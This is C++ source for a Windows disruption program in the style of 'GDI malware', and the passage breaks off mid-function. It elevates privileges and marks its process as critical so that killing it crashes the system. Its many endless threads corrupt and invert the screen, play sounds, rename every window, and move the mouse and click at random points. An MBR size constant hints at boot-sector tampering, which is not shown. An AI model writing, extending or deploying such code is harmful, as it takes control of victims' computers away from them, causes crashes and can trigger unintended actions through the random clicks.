#include <tchar.h>
#include <windows.h>
#include <stdio.h>      /* printf, NULL */    /* srand, rand */
#include <time.h>       /* time */
#include <iostream>
#include <cmath>
#include <MMSystem.h>
#include <iostream>
#include<string>
#include <stdlib.h>
#include <stddef.h>
#include <winternl.h>
#include <gdiplus.h>
using namespace std;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;
using namespace Gdiplus;
#define MBR_SIZE 512
#pragma comment(lib, "winmm.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
typedef VOID ( _stdcall *RtlSetProcessIsCritical ) (
               IN BOOLEAN        NewValue,
               OUT PBOOLEAN OldValue, // (optional)
               IN BOOLEAN     IsWinlogon );
 static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
BOOL CALLBACK H(HWND hwnd, LPARAM lParam)
{

  int ws = GetWindowTextLength(hwnd);
  LPSTR    pszMem = (PSTR) VirtualAlloc((LPVOID) NULL,
    (DWORD) (ws + 1), MEM_COMMIT,
    PAGE_READWRITE);
  GetWindowTextA(hwnd,pszMem,ws);
  HDC hdc = GetDC(HWND_DESKTOP);
  TextOut(hdc,rand() % GetDeviceCaps(hdc,HORZRES),rand() % GetDeviceCaps(hdc,VERTRES),pszMem,ws);
  ReleaseDC(HWND_DESKTOP,hdc);
  Sleep(27);
    return TRUE;
}
BOOL EnablePriv(LPCSTR lpszPriv) // by Napalm
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
     
    if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
     
    if(!LookupPrivilegeValue(NULL, lpszPriv, &luid)){
        CloseHandle(hToken); return FALSE;
    }
     
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}
 
BOOL ProtectProcess() // by _FIL73R_
{
   HANDLE hDLL;
   RtlSetProcessIsCritical fSetCritical;
 
   hDLL = LoadLibraryA("ntdll.dll");
   if ( hDLL != NULL )
   {
    EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical) GetProcAddress( (HINSTANCE)hDLL, "RtlSetProcessIsCritical" );
          if(!fSetCritical) return 0;
          fSetCritical(1,0,0);
    return 1;
   } else
          return 0;
}
int x = GetSystemMetrics(0);
int y = GetSystemMetrics(1);
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
//	POINT p;
//	GetCursorPos(&p); 
//	const char Wm = rand() % 5146234342654234234235324342342367342342354;
//std::string txt = TEXT("\r\n\r\n");
	SetWindowText(hwnd,TEXT("Selodin"));

	return TRUE;
}
DWORD WINAPI effwec(LPVOID lpvd){
while(1){
    for (int i = 0; i < GetSystemMetrics(0);i++){
     HDC hdc = GetDC(0);
     BitBlt(hdc,i,0,1,GetSystemMetrics(1),hdc,i,0,NOTSRCCOPY);
     ReleaseDC(0,hdc);
     Sleep(1);
    }
}
}
DWORD WINAPI effwec2(LPVOID lpvd){
while(1){
    for (int i = 0; i < GetSystemMetrics(1) + 9;i++){
     HDC hdc = GetDC(0);
     BitBlt(hdc,0,i - rand() % GetSystemMetrics(1),GetSystemMetrics(0),1,hdc,0,rand() % GetSystemMetrics(1),SRCCOPY);
     ReleaseDC(0,hdc);
     Sleep(7);
    }
}
}
DWORD WINAPI effwec3(LPVOID lpvd){
while(1){
    for (int i = 0; i < GetSystemMetrics(0);i++){
     HDC hdc = GetDC(0);
     BitBlt(hdc,i ,0,1,GetSystemMetrics(1),hdc,rand() % GetSystemMetrics(0),0,MERGECOPY);
     ReleaseDC(0,hdc);
    // Sleep(1);
    }
}
}
DWORD WINAPI effwec4(LPVOID lpvd){
while(1){
 for (int i = 0; i < GetSystemMetrics(0)+ 9;i++){   HDC hdc = GetDC(0);
          BitBlt(hdc,i,0,GetSystemMetrics(0) & i,GetSystemMetrics(1),hdc,0,0,SRCCOPY);  ReleaseDC(0,hdc); Sleep(9);
    }
    }

}
DWORD WINAPI effwec5(LPVOID lpvd){
while(1){
    for (int i = 0; i < GetSystemMetrics(0);i++){
     HDC hdc = GetDC(0);
     HBRUSH g = CreateSolidBrush(RGB(rand() % 213,rand() % 213,rand() % 213));
     SelectObject(hdc,g);
     BitBlt(hdc,i,0,1,GetSystemMetrics(1),hdc,i,0,PATINVERT);
     DeleteObject(g);
     ReleaseDC(0,hdc);
     Sleep(2);
    }
}
}
DWORD WINAPI effwec6(LPVOID lpvd){
while(1){
    for (int i = 0; i < GetSystemMetrics(0)+ 9;i++){
    for (int f = 0; f < GetSystemMetrics(1)+ 9;f++){
         HDC hdc = GetDC(0);
         f++;
     BitBlt(hdc,1,0,GetSystemMetrics(0),f,hdc,0,0,SRCCOPY);
     ReleaseDC(0,hdc);
Sleep(10);
    }
    }
}
}
DWORD WINAPI effwec7(LPVOID lpvd){
    	HWND desktop = GetDesktopWindow();
	HDC dc = GetWindowDC(0);

	RECT rekt;
	GetWindowRect(desktop, &rekt);

	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;
	//PlaySound(MAKEINTRESOURCE(020), GetModuleHandle(NULL), SND_RESOURCE|SND_ASYNC);
	//Sleep(1500);
//PlaySound(MAKEINTRESOURCE(010), GetModuleHandle(NULL), SND_RESOURCE|SND_ASYNC|SND_LOOP);
	HBITMAP screenshot = CreateCompatibleBitmap(dc, w, h);
	HDC dc2 = CreateCompatibleDC(dc);
	SelectObject(dc2, screenshot);
while(1){

			 dc = GetWindowDC(0);
		BitBlt(dc2, 0, 0, w, h, dc, 0, 0, NOTSRCERASE|SRCINVERT);
		BitBlt(dc, 0, 0, w, h, dc2, (rand() % 30) - 15, (rand() % 30) - 15, NOTSRCERASE|SRCINVERT);
		Sleep(50);
		BitBlt(dc, 0, 0, w, h, dc2, 0, 0, NOTSRCERASE|SRCINVERT);
		Sleep(50);
		ReleaseDC(0,dc);
}
}
DWORD WINAPI effwec8(LPVOID lpvd){
while(1){
    for (int i = 0; i < GetSystemMetrics(0);i++){
    for (int f = 0; f < GetSystemMetrics(1);f++){
         HDC hdc = GetDC(0);
         f++;
     BitBlt(hdc,-1,0,GetSystemMetrics(0),f,hdc,0,0,SRCCOPY);
     ReleaseDC(0,hdc);
Sleep(6);
    }
    }
}
}
DWORD WINAPI effwec9(LPVOID lpvd){
while(1){
    
         HDC hdc = GetDC(0);
        HBRUSH g = CreateSolidBrush(RGB(rand() %128,rand() % 98,rand() % 118));
     SelectObject(hdc,g);
     BitBlt(hdc,rand() % GetSystemMetrics(0) / GetSystemMetrics(1) ,rand() % GetSystemMetrics(1),GetSystemMetrics(0),GetSystemMetrics(1),hdc,rand() * GetSystemMetrics(0) % GetSystemMetrics(1),rand() % GetSystemMetrics(0) & GetSystemMetrics(1),SRCINVERT|PATINVERT);
     DeleteObject(g);
     ReleaseDC(0,hdc);
Sleep(100);
    
}
}
DWORD WINAPI effwecA(LPVOID lpvd){
while(1){
    
         HDC hdc = GetDC(0);
        HBRUSH g = CreateSolidBrush(RGB(rand() %128,rand() % 98,rand() % 118));
     SelectObject(hdc,g);
     BitBlt(hdc,rand() % -GetSystemMetrics(0) ^ -GetSystemMetrics(1) ,rand() % -GetSystemMetrics(1),GetSystemMetrics(0),GetSystemMetrics(1),hdc,rand() * -GetSystemMetrics(0) % -GetSystemMetrics(1),rand() % -GetSystemMetrics(0) & -GetSystemMetrics(1),SRCINVERT|PATINVERT);
     DeleteObject(g);
     ReleaseDC(0,hdc);
Sleep(60);
    
}
}
DWORD WINAPI effwecB(LPVOID lpvd){
while(1){
    
         HDC hdc = GetDC(0);
        HBRUSH g = CreateSolidBrush(RGB(rand() %128,rand() % 98,rand() % 118));
     SelectObject(hdc,g);
     BitBlt(hdc,0,0,GetSystemMetrics(0),GetSystemMetrics(1),hdc,0,0,MERGECOPY|NOTSRCERASE);
      BitBlt(hdc,rand() % GetSystemMetrics(0) ,rand() % GetSystemMetrics(1),GetSystemMetrics(0),GetSystemMetrics(1),hdc,0,0,PATINVERT);
     DeleteObject(g);
     ReleaseDC(0,hdc);
Sleep(250);
    
}
}
DWORD WINAPI sounds(LPVOID lpvd){
int i;
srand(time(0));
while(1){

for( ;;){
	srand(time(0));
	int i = 1 | (rand() % 20);
 //	switch(i){
	//if (i < 11){
	
if(i == 1){
		PlaySound(MAKEINTRESOURCE(2010), (HINSTANCE)GetModuleHandle(0), SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);}
		if(i== 2){
		PlaySound(MAKEINTRESOURCE(2020), 0, SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);}
	if(i == 3){
		PlaySound(MAKEINTRESOURCE(2030), 0, SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);}
	if(i == 4){
		PlaySound(MAKEINTRESOURCE(2040), 0, SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);}
		if(i == 5){
		PlaySound(MAKEINTRESOURCE(2050), 0, SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);
	}
	if(i == 6){
		PlaySound(MAKEINTRESOURCE(2060), 0, SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);
	}
	if(i == 7){
		PlaySound(MAKEINTRESOURCE(2070), 0, SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);
	}
	if(i == 8){
		PlaySound(MAKEINTRESOURCE(2080), 0, SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);
	}
	if(i == 9){
		PlaySound(MAKEINTRESOURCE(2090), 0, SND_RESOURCE | SND_SYNC);i = 1 | (rand() % 10);
	}
if(i == 10){

		PlaySound(MAKEINTRESOURCE(2100), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 20);
		//	break;
}
if(i == 11){

		PlaySound(MAKEINTRESOURCE(2110), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 12){

		PlaySound(MAKEINTRESOURCE(2120), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 13){

		PlaySound(MAKEINTRESOURCE(2130), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 14){

		PlaySound(MAKEINTRESOURCE(2140), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 15){

		PlaySound(MAKEINTRESOURCE(2150), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 16){

		PlaySound(MAKEINTRESOURCE(2160), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 17){

		PlaySound(MAKEINTRESOURCE(2170), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 18){

		PlaySound(MAKEINTRESOURCE(2180), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 19){

		PlaySound(MAKEINTRESOURCE(2100), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
		//	break;
}
if(i == 20){

		PlaySound(MAKEINTRESOURCE(2200), 0, SND_RESOURCE | SND_SYNC);
i = 1 | (rand() % 10);
	//	break;
}
}
}
	}
	DWORD WINAPI refresh(LPVOID lpvd){

while(1){


	
InvalidateRect(0,0,0);
Sleep(rand() % 2048);
}
	}

		



DWORD WINAPI text(LPVOID lpvd){

while(1){

	Sleep(rand() % 8192-16384);
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

}
}
DWORD WINAPI mouse(LPVOID lpvd){

while(1){
 x = rand () % GetSystemMetrics(0);
 y = rand () %  GetSystemMetrics(1);
 POINT p;
GetCursorPos(&p);
		SetCursorPos(rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));
		INPUT input;
    input.type = INPUT_MOUSE;
   input.mi.dx = x * (65536.0f / GetSystemMetrics(SM_CXSCREEN));
        input.mi.dy = y * (65536.0f / GetSystemMetrics(SM_CYSCREEN));
        input.mi.dwFlags = (MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP);
        input.mi.mouseData = 0;
        input.mi.dwExtraInfo = NULL;
        input.mi.time = 0;
        
    //c++
        //SetCursorPos(new_cursor_x, (new_cursor_y + windowPosForeground.bottom));

        SendInput(1, &input, sizeof(INPUT));
mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
Sleep(2300);

}
}
DWORD WINAPI effwecC(LPVOID lpvd){
while(1){
    for (int i = 0; i < GetSystemMetrics(0);i++){
     HDC hdc = GetDC(0);
     BitBlt(hdc,i ,0,1,GetSystemMetrics(1),hdc,rand() % GetSystemMetrics(0),0,MERGECOPY);
     ReleaseDC(0,hdc);
     Sleep(13);
    }
}
}
DWORD WINAPI effwecD(LPVOID lpvd){
while(1){
     InvalidateRect(0,0,0);
            //int g;
            for (int g = 1; g < 255; g=g+2){
                    int a = a ^ g * 20;
int y = (int)cbrt(g & a) >> y;
	//	InvalidateRect(0,0,0);
	HWND desktop = GetDesktopWindow();
	HDC hdc = GetWindowDC(0);
int f = (int)tan(a) % 200 >> 2;
	RECT rekt;
	GetWindowRect(desktop, &rekt);
int u = GetSystemMetrics(SM_CXSIZE) ^ 3;
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;
//	PlaySound(MAKEINTRESOURCE(020), GetModuleHandle(NULL), SND_RESOURCE|SND_ASYNC);
	//Sleep(1500);
//PlaySound(MAKEINTRESOURCE(010), GetModuleHandle(NULL), SND_RESOURCE|SND_ASYNC|SND_LOOP);
	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc1 = CreateCompatibleDC(hdc);
	SelectObject(hdc1, screenshot);
	for (int i = 0; i < 256; i++){

		for (int j = 0; j < 256; j++){SelectObject(hdc1, screenshot);
		int t = j ^ i ^ (int)ceil(a);
		//g = g+9;
		int yea = (a << t + (y % 255)|y ^257);
		SetPixel(hdc1,i,j,RGB(j^i >> a, a << y & i ^ j, y >> g | j ^ i));
			SetPixel(hdc1,i & j,j ^ i ,RGB(a * i ^ g,j ^ t, j * i));
			SetPixel(hdc1,i & g ^ t,j >> a,RGB(j & t >> 4 * a & g ^ (i & a) % 2 , j ^ i & y ^ g , j & i + a ));
		///	//SetPixel(hdc1,i,j,RGB(j >> g ^ i ,j & g ,j & g ));
	/*	HDC hdc = GetWindowDC(0);
		HDC hdc1 = CreateCompatibleDC(hdc);
		SetPixel(hdc1,i,j,RGB(i ^ j,i - j,i ^5  ^j));
		HBITMAP screenshot = CreateCompatibleBitmap(hdc,256, 256);
		SelectObject(hdc1, screenshot);
		BitBlt(hdc1,0,0,256,256,hdc,0,0,SRCCOPY);

		DeleteObject(screenshot);
	ReleaseDC(0,hdc1);
		ReleaseDC(0,hdc);
		Sleep(50);*/
	//	Sleep(50);
		}}
		for( int x = 0; x < GetSystemMetrics(0);x=x+256){
		for( int y = 0; y < GetSystemMetrics(1);y=y+256){
		SelectObject(hdc1, screenshot);
		BitBlt(hdc1,x,y,256,256,hdc1,0,0,SRCCOPY );
	}
	}//InvalidateRect(0,0,true);
			BitBlt(hdc,0,0,GetSystemMetrics(0),GetSystemMetrics(1),hdc1,0,0, SRCCOPY);
			DeleteObject(screenshot);
			DeleteDC(hdc1);
			ReleaseDC(0,hdc);
//g++;}
		}



}
}
DWORD WINAPI effwecE(LPVOID lpvd){
while(1){
  //  for (int i = 0; i < GetSystemMetrics(0);i++){
     HDC hdc = GetDC(0);
     BitBlt(hdc,0 ,-1,GetSystemMetrics(0),GetSystemMetrics(1),hdc,0,0,MERGECOPY);
     BitBlt(hdc,0 ,2,GetSystemMetrics(0),GetSystemMetrics(1),hdc, 0,0,SRCPAINT);
     ReleaseDC(0,hdc);
     Sleep(55);
   // }
}
}
DWORD WINAPI effwecF(LPVOID lpvd){
while(1){
  HWND desktop = GetDesktopWindow();
     HDC hdc = GetDC(0);
     RECT rekt;
     GetWindowRect(desktop, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;
	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc1 = CreateCompatibleDC(hdc);
	SelectObject(hdc1, screenshot);
	
	BitBlt(hdc1,0,0,w,h,hdc,0,0,SRCCOPY );
    Graphics g (hdc1);
   
	
SolidBrush brush (Color (9 /*A*/, 150 /*R*/, 150 /*G*/,150 /*B*/));
g.FillRectangle (&brush, 0, 0, w, h);

	BitBlt(hdc,0,0,w,h,hdc1,0,0,SRCCOPY);
	DeleteObject(screenshot);
	DeleteDC(hdc1);
     ReleaseDC(0,hdc);
     Sleep(23);
   
}
}
DWORD WINAPI effwec10(LPVOID lpvd){
	  HWND desktop = GetDesktopWindow();
	HDC hdc = GetDC(0);
		HDC hdc1 = CreateCompatibleDC(hdc);
		 RECT rekt;
     GetWindowRect(desktop, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;
//	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
while(1){

      hdc = GetDC(0);
    	  rekt;
     GetWindowRect(desktop, &rekt);
	 w = rekt.right - rekt.left;
	 h = rekt.bottom - rekt.top;
	 hdc1 = CreateCompatibleDC(hdc);
	 HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdc1, screenshot);
//	for(int v = 0; v < 255; v++){
	
//	for(int v = 0; v < 255; v++){
		
	BitBlt(hdc1,0,0,w,h,hdc,0,0,SRCCOPY );
    Graphics g (hdc1);
   int m;
  // m < 125;
   m < GetSystemMetrics(0);
   m++;
	
SolidBrush brush (Color (rand () % 9 /*A*/, rand () % 190 /*R*/, rand () % 250 /*G*/,rand () % 160 /*B*/));
g.FillRectangle (&brush, 0, 0, w, h);
int i;
int l = (i >> 10) ^ m;
	l < 50;
	l++;
	BitBlt(hdc1,i ^ m >> l ^ m,m ,w ,h,hdc1,m & i + 10,l,SRCCOPY);
		BitBlt(hdc,0,0,w,h,hdc1,0,0,SRCCOPY);

	DeleteObject(screenshot);
	DeleteDC(hdc1);
     ReleaseDC(0,hdc);
     Sleep(15);
     i++;
   
}
}
DWORD WINAPI effwec11(LPVOID lpvd){
	 srand((unsigned) time(0));
while(1){
        RECT rekt;
        HWND desktop = GetDesktopWindow();
GetWindowRect(desktop, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;
	   int k = 1 + (rand() % h & w) + 7;
        int x = GetSystemMetrics(0);
int y = GetSystemMetrics(1);

        HDC hdc = GetWindowDC(0);
HDC hdcmem = CreateCompatibleDC(hdc);
HBITMAP g = CreateCompatibleBitmap(hdc,w,h);
  SelectObject(hdcmem,g);
BitBlt(hdcmem,0,0,w,h,hdc,0,0,SRCCOPY);
    for(int i = 2 ;i < 7 ; i++){
          int l = i >> l;
          int u = i ^ k & rand() % 255;
          int a = w & h;
            // for(int m = 0 ;m % k; m=m+30){
          //   for(int i = 0 ;i < GetSystemMetrics(1); i++){
        //  g = CreateCompatibleBitmap(hdc,w,h);
        POINT j[3];
        j[0].x = h + l * k;
         j[0].y =   l & x & k ^ a;

        j[1].x =    u << l;
         j[1].y = x >> a;
         j[2].x =k ^ a;
         j[2].y = l & a ^ i;

            SelectObject(hdcmem,g);
         //   BitBlt(hdcmem,l >> i,i % k,GetSystemMetrics(0),25,hdc,l,i ^ k ,SRCCOPY);
 //BitBlt(hdcmem,i ^ k >> w,-i ^    -k % w,GetSystemMetrics(0),GetSystemMetrics(0) ^ l,hdc,l << i,i ^ k ,SRCCOPY);
 PlgBlt(hdc,j,hdc,0,0,GetSystemMetrics(0),GetSystemMetrics(1),0,0,0);
 //BitBlt(hdc,0,0,GetSystemMetrics(0),GetSystemMetrics(1),hdcmem,0,0,SRCCOPY);
          //}
            // }

    }

   // BitBlt(hdc,0,0,GetSystemMetrics(0),GetSystemMetrics(1),hdcmem,0,0,SRCCOPY);
    DeleteObject(g);
    DeleteDC(hdcmem);
    ReleaseDC(0,hdc);
}
}
DWORD WINAPI effwec12(LPVOID lpvd){
while(1){
  //HWND desktop = GetDesktopWindow();
  int y = rand() % GetSystemMetrics(1) + 1;
  int i;
for  (  i = rand() % GetSystemMetrics(0)+1+rand() % GetSystemMetrics(1)+1; i < 800; i++){
HBRUSH h = CreateSolidBrush(RGB(rand () % 255,rand () % 255,rand () % 255));


   HDC hdc = GetDC(0);
SelectObject(hdc,h);
   BitBlt(hdc,i,i % y,256,256,hdc,y,i,PATCOPY);
   DeleteObject(h);
   ReleaseDC(0,hdc);
   Sleep(20);
}
  
}
}
DWORD WINAPI effwec13(LPVOID lpvd){
while(1){
  HDC hdc = GetDC(0);
  RECT rekt;
     HWND desktop = GetDesktopWindow();
GetWindowRect(desktop, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;
  POINT pepe[4];
  pepe[0].x = w;
  pepe[0].y = 0;
  pepe[1].x = 0;
  pepe[1].y = 0;
  pepe[2].x = w;
  pepe[2].y = h;
   pepe[3].x = 0;
  pepe[3].y = 0;
  PlgBlt(hdc,pepe,hdc,0,0,w,h,0,0,0);
  ReleaseDC(0,hdc);
  Sleep(rand() % 420);
}
}
DWORD WINAPI effwec14(LPVOID lpvd){
  while(1){
 //  for(int s = 46; s + 64;s++){
int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 1;; i++, i %= 9) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 55, data);
        int s = rand() % 526;
      //  s + 1;
       //  s=s+150;
         s ++;
        int v = 1;
        //int s = 1168;
        int n = 2;
        n + 1;
        n++;
        v++;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 5)
            byte = 255;
        for (int i = 1; w * h > i; i++) {
            if (i % h == 0 & 1)
               // int g = 256;
           // int a = 256;
                v = s >> n ;
             //   v++;
            ((BYTE*)(data + i))[v - v ^ s ] = ((BYTE*)(data + i + v + s))[v];
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);

        DeleteObject(desk);
        Sleep(5);

    }

 // }
    }
}
DWORD WINAPI effwec15(LPVOID lpvd){
 while(1){
 //  for(int s = 1; s + 1;s=s+150){
int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 1;; i++, i & 9) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 55, data);
        int v = 0;
        int s = rand() % 600;
        s++;
        int n = 5;
        n + 1;
        n++;
        v++;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 74)
            byte = randy()%0xff;
        for (int i = 1; w * h > i; i++) {
            if (i % h == 5 & randy() % 255 == 128)
               // int g = 256;
           // int a = 256;
                v = s -  n  / i;
             //   v++;
            ((BYTE*)(data + i))[v & i & s] = ((BYTE*)(data + i + n + s))[v];
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);

        DeleteObject(desk);
      //  Sleep(5);

    }

   // }
    }
}
DWORD WINAPI effwec16(LPVOID lpvd){
 while(1)  
 EnumChildWindows (GetDesktopWindow(), &H, NULL);
}
DWORD WINAPI effwec17(LPVOID lpvd){

    while(1){
    int timer = rand() % 2;
if(timer == 1){

  int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,(h*w + h) * sizeof(RGBQUAD),MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
for(  int s = 1;s < 1200;s++){
    for (int i = 1;; i ++, i %=8){

          HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm,w*h*4,data);
        int a = 20 * (a & 21) + sin(a/150);
        a < tan(10 & 32 * a);
        a++;
        int v = rand() % 1 ^ 99;
        int b = cos(a % 62) + sin(30) / sqrt( b * 20);
        b++;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 1)
            byte = randy()%0xff;
        for (int i = 1; w * h > i; i++) {
            if (i %w == 0 && randy() % 1)
                v = 62 && sin(b + a);

            ((BYTE*)(data + i ))[v & timer++ ^ a >> b & rand() / 199 << s] = ((BYTE*)(data + i + v + a))[0];
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
}}

}}
	DWORD WINAPI effwec18(LPVOID lpvd){

while(1){


int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 1;; i++, i & 9) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 55, data);
        int v = 1 ^ rand() % 257;

        int s = 1 + rand() % 255;

        s++;
        int n = 5;
        n + 1;
             int xp = v + n * 10;
        n++;
        v++;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 74)
            byte = randy()%0xff;
        for (int i = 1; w * h > i; i++) {
            if (i % h == 5 & randy() % 255 == 128)
               // int g = 256;
           // int a = 256;
                v = 24 + s % xp;
             //   v++;
            ((BYTE*)(data + i))[v & i | s ]= ((BYTE*)(data + i + n + v))[v];
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);

        DeleteObject(desk);
      //  Sleep(5);

    }
}
	}

	DWORD WINAPI effwec19(LPVOID lpvd){

while(1){


int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i ^ w % h, y = i / (h || RGB(255,255,255));
            if (i == 20){

                x = 29 + sin( 21);
            }
            data[i].rgb -= x ^ y;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
	}
}
	DWORD WINAPI effwec20(LPVOID lpvd){

  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
while(1){

   // desk = GetDC(0);
    for (float me = 0; me < sw + sh; me += 0.99f){
            int a = sin(angle) * 20;
         desk = GetDC(0);
         BitBlt(desk,0,me,sw,1,desk,a,me,SRCCOPY);
         angle += M_PI / 80;
         ReleaseDC(0,desk);
    DeleteObject(&a);
    DeleteObject(&me);
DeleteDC(desk);
    }
}
}
	DWORD WINAPI effwec21(LPVOID lpvd){
		while(1){
		
  int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
